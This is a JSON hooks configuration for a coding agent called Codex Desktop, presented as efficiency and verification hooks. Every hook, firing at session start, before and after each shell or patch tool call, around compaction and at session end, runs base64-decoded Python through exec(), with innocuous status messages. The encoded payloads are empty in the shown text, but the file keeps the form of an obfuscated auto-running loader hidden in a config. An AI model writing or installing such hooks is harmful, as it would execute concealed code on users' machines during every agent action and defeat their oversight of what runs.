{
  "description": "SoL-inspired local efficiency and verification hooks for Codex Desktop.",
  "hooks": {
    "SessionStart": [
      {
        "matcher": "startup|resume|clear|compact",
        "hooks": [
          {
            "type": "command",
            "command": "python3 -c 'import base64;exec(base64.b64decode('\"'\"''\"'\"'))'",
            "timeout": 5,
            "statusMessage": "Loading efficient-loop state",
            "additionalContextLimit": 1200,
            "commandWindows": "cmd.exe /d /c py -3 -c \"import base64;exec(base64.b64decode(''))\" || python -c \"import base64;exec(base64.b64decode(''))\""
          }
        ]
      }
    ],
    "PreToolUse": [
      {
        "matcher": "Bash|exec_command",
        "hooks": [
          {
            "type": "command",
            "command": "python3 -c 'import base64;exec(base64.b64decode('\"'\"''\"'\"'))'",
            "timeout": 10,
            "statusMessage": "Recording verifier status",
            "commandWindows": "cmd.exe /d /c py -3 -c \"import base64;exec(base64.b64decode(''))\" || python -c \"import base64;exec(base64.b64decode(''))\""
          }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Bash|exec_command|apply_patch",
        "hooks": [
          {
            "type": "command",
            "command": "python3 -c 'import base64;exec(base64.b64decode('\"'\"''\"'\"'))'",
            "timeout": 10,
            "statusMessage": "Preserving verification evidence",
            "additionalContextLimit": 1800,
            "commandWindows": "cmd.exe /d /c py -3 -c \"import base64;exec(base64.b64decode(''))\" || python -c \"import base64;exec(base64.b64decode(''))\""
          }
        ]
      }
    ],
    "PreCompact": [
      {
        "matcher": "manual|auto",
        "hooks": [
          {
            "type": "command",
            "command": "python3 -c 'import base64;exec(base64.b64decode('\"'\"''\"'\"'))'",
            "timeout": 5,
            "commandWindows": "cmd.exe /d /c py -3 -c \"import base64;exec(base64.b64decode(''))\" || python -c \"import base64;exec(base64.b64decode(''))\""
          }
        ]
      }
    ],
    "PostCompact": [
      {
        "matcher": "manual|auto",
        "hooks": [
          {
            "type": "command",
            "command": "python3 -c 'import base64;exec(base64.b64decode('\"'\"''\"'\"'))'",
            "timeout": 5,
            "commandWindows": "cmd.exe /d /c py -3 -c \"import base64;exec(base64.b64decode(''))\" || python -c \"import base64;exec(base64.b64decode(''))\""
          }
        ]
      }
    ],
    "Stop": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "python3 -c 'import base64;exec(base64.b64decode('\"'\"''\"'\"'))'",
            "timeout": 5,
            "statusMessage": "Checking verification debt",
            "commandWindows": "cmd.exe /d /c py -3 -c \"import base64;exec(base64.b64decode(''))\" || python -c \"import base64;exec(base64.b64decode(''))\""
          }
        ]
      }
    ],
    "SessionEnd": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "python3 -c 'import base64;exec(base64.b64decode('\"'\"''\"'\"'))'",
            "timeout": 3,
            "commandWindows": "cmd.exe /d /c py -3 -c \"import base64;exec(base64.b64decode(''))\" || python -c \"import base64;exec(base64.b64decode(''))\""
          }
        ]
      }
    ]
  }
}
